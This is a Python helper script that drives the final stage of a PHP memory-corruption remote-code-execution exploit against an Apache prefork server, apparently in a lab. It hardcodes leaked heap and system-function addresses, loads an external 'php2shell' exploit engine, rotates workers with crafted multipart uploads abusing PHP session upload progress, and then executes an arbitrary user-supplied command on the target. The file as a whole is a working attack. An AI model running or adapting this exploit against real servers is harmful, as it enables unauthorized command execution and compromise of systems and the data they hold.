#!/usr/bin/env python3
"""Run another short command after rce_display_on.py leaked this lab's bases.

The addresses remain stable across prefork child replacement while the Apache
master stays alive.  This helper uses the 900x3000 rotation calibrated after a
proof-file GET, then sends only the terminal A/B pair.
"""

from __future__ import annotations

import argparse
import importlib.util
import time
from pathlib import Path


REPO = Path(__file__).resolve().parents[2]
ENGINE = REPO / "sources" / "alvarodh5-php2shell" / "exploit.py"
HEAP = 0x717B64200000
ZIF_SYSTEM = 0x717B66334370
HTDATA = HEAP + 0x690D8


def load_engine():
    spec = importlib.util.spec_from_file_location("php2shell_engine", ENGINE)
    if spec is None or spec.loader is None:
        raise RuntimeError(f"cannot load {ENGINE}")
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def rotate(engine, target) -> None:
    boundary = b"S" * 17
    parts = [
        {"name": f"f{index:04d}"[:5], "data": b"V" * 3000}
        for index in range(900)
    ]
    parts += [
        {"name": "PHPSESSID", "data": b"\x00"},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        {"name": "f", "filename": "a.txt", "data": b"A" * 64},
        {"name": "big", "data": b"B" * (12 * 1024 * 1024)},
    ]
    prime = target.post(engine.multipart(parts, boundary), boundary, timeout=90)
    print(f"[*] rotation prime response={len(prime)} bytes")
    cleanup_boundary = b"BNDRY12345"
    cleanup_parts = [
        {"name": "PHPSESSID", "data": engine.SID},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]
    cleanup_body = engine.multipart(cleanup_parts, cleanup_boundary)
    for attempt in range(1, 4):
        time.sleep(0.2)
        response = target.post(
            cleanup_body,
            cleanup_boundary,
            read_cap=65536,
            timeout=20,
        )
        print(f"[*] cleanup {attempt}/3 response={len(response)} bytes")
        if not response:
            print("[+] fresh replacement worker")
            return
    raise RuntimeError("worker rotation failed")


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", default="http://192.168.125.10/index.php")
    parser.add_argument("-c", "--cmd", required=True)
    parser.add_argument("--retries", type=int, default=6)
    args = parser.parse_args()
    if len(args.cmd.encode()) > 14:
        parser.error("command is limited to 14 bytes")

    engine = load_engine()
    target = engine.Target(args.url, timeout=45)
    for attempt in range(1, args.retries + 1):
        print(f"[*] terminal attempt {attempt}/{args.retries}")
        rotate(engine, target)
        exploit = engine.Exploit(
            target,
            args.cmd,
            ZIF_SYSTEM,
            0x65EB60,
            0x690D8,
            12,
        )
        original = target.post
        timings: list[tuple[float, int]] = []

        def timed_post(*post_args, **post_kwargs):
            started = time.monotonic()
            response = original(*post_args, **post_kwargs)
            timings.append((time.monotonic() - started, len(response)))
            return response

        target.post = timed_post
        try:
            exploit.stage3_9bie(HTDATA)
        finally:
            target.post = original
        for index, (elapsed, size) in enumerate(timings, 1):
            print(
                f"[*] terminal POST {index}: {elapsed:.3f}s, "
                f"response={size} bytes"
            )
        if len(timings) == 2 and timings[-1][1] == 0:
            print("[+] terminal worker closed the socket")
            return 0
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
